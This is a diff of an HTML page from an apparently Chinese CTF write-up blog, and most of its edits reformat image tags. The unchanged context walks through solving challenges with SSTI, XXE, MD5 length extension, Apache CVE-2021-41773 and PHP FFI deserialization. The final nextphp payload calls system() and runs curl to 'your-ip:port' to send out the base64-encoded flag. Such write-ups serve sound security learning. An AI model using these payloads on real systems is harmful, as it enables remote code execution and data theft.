@@ -379,9 +379,7 @@
 <p>发现源代码中在age这个点有渲染，同时我们可以找到age的注入点，猜测是不是go有SSTI。</p>
 <p>https://tyskill.github.io/posts/gossti</p>
 <p>于是照着文章里尝试看看能不能打出admin的Password，顺利拿到flag。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /><figcaption aria-hidden="true">image-20220816155906990</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816155906990.png" alt="image-20220816155906990" /></p>
 <h3 id="bjdctf-cookie-stubletwig模板注入">2、BJDCTF-Cookie stuble（twig模板注入）</h3>
 <p>打开界面，Hint提示看一下Cookies，同时发现前端会动态显示用户名</p>
 <p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/%5BT8KS0BQQGOGD8O0I2H05GU.png" alt="img" style="zoom:50%;" /></p>
@@ -407,9 +405,7 @@
 <p>接下来就是制作存在XXE的xlsx文件，直接读取<code>/flag</code>（之前在任意读取时，测试发现这个文件被ban掉了）</p>
 <p>制作的时候需要注意，xlsx改后缀为zip文件后，直接用winrar打开后在内部修改，解压后再压缩可能出现问题。</p>
 <p>最后打出flag。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /><figcaption aria-hidden="true">image-20220816152852215</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816152852215.png" alt="image-20220816152852215" /></p>
 <h2 id="代码审计">6、代码审计</h2>
 <h3 id="de1ctf-2019ssrf-me代码审计哈希扩展攻击">1、[De1ctf 2019]SSRF Me（代码审计/哈希扩展攻击）</h3>
 <p>首先看源代码</p>
@@ -431,14 +427,10 @@
 <p>需要注意的是此处必须是salt + message，如果顺序颠倒，则无法实现md5hash扩展攻击。</p>
 <p>利用现成的脚本:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">28 = len(secret_key) + len(&quot;flag.txt&quot;) + len(&quot;read&quot;)</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /><figcaption aria-hidden="true">image-20221018011057035</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011057035.png" alt="image-20221018011057035" /></p>
 <p>将生成的结果注入，注意要在action前面加上scan</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param=flag.txt</span><br></pre></td></tr></table></figure>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /><figcaption aria-hidden="true">image-20221018011220758</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20221018011220758.png" alt="image-20221018011220758" /></p>
 <h3 id="gfctf-baby_web变量覆盖">2、GFCTF-Baby_Web（变量覆盖）</h3>
 <p>这道题主要考察PHP源码审计的能力，当然要想做出来这道题，还是需要一些额外的技巧。</p>
 <p><code>F12</code>发现源代码，暗示存在路径穿越。</p>
@@ -464,31 +456,21 @@
 <h3 id="nssez_rcecve-2021-41773">1、NSS—ez_rce（CVE-2021-41773）</h3>
 <p>打开网页，啥都没有，抓个包发现headers里也没有信息，只能扫一下目录，看看有没有源码/后台/api泄露。</p>
 <p>如果再没有，看看服务器中间件等等有无一些新出的CVE。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /><figcaption aria-hidden="true">image-20220819205451649</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205451649.png" alt="image-20220819205451649" /></p>
 <p>看到/cgi-bin，想到之前apache出的cve，检查一下apache的版本2.4.49，基本确定是路径穿越的CVE。</p>
 <p>于是使用rce的payload：</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /><figcaption aria-hidden="true">image-20220819205728808</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205728808.png" alt="image-20220819205728808" /></p>
 <p>利用grep找到flag</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /><figcaption aria-hidden="true">image-20220819205821071</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819205821071.png" alt="image-20220819205821071" /></p>
 <h2 id="php扩展">9、PHP扩展</h2>
 <h3 id="rctf-nextphpffi">1、RCTF-nextphp（FFI）</h3>
 <p>这道题的代码还是非常简单，单刀直入。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>查看phpinfo之后发现经典的disable_function</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /><figcaption aria-hidden="true">image-20220923152627815</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923152627815.png" alt="image-20220923152627815" /></p>
 <p>蚁剑连接之后，发现没法上传文件，LD_PRELOAD的利用失败了。</p>
 <p>发现同目录下存在preload.php，并且该文件可编辑，也被index.php包含了</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /><figcaption aria-hidden="true">image-20220923161449908</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161449908.png" alt="image-20220923161449908" /></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">            <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">            <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char *command);&#x27;</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">            array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>看起来我们的攻击点在run函数，如何利用run函数是一个问题</p>
 <p>这里就引到了PHP的FFI扩展，简单来说就是在PHP中引入C语言的这样一种机制，那么我们就可以利用C语言标准库里的system来绕过disable_function。</p>
@@ -502,9 +484,7 @@
 <p>首先，我们注意到存在两个序列化函数，两者的效果是不同，__serialize()返回的是数组的序列化结果，serialize()返回的是class A的序列化结果。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;int system(char *command);&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//注意两者的区别</span></span><br><span class="line">C:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">89</span>:&#123;a:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;ret&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;FFI::cdef&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;arg&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;int system(char *command);&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>其次，对于获取到被赋值的data['ret']，最开始的时候我想的是直接修改源代码，将data属性修改为public，但是失败了var_dump查看之后，发现属性仍然为protected，查询了opache.preload，才发现preload.php已经被编译为opcode，我们修改文本是没有意义的。</p>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /><figcaption aria-hidden="true">image-20220923161825562</figcaption>
-</figure>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png" alt="image-20220923161825562" /></p>
 <p>于是重新构造payload，这回利用__serialize()能够返回data，最后成功构造payload。</p>
 <p>最后是无回显的，当然这已经是小问题了。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=unserialize(<span class="string">&#x27;C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125;&#x27;</span>)-&gt;__serialize()[<span class="string">&#x27;ret&#x27;</span>]-&gt;system(<span class="string">&#x27;curl http://your-ip:port/`cat /flag | base64`&#x27;</span>);</span><br></pre></td></tr></table></figure>
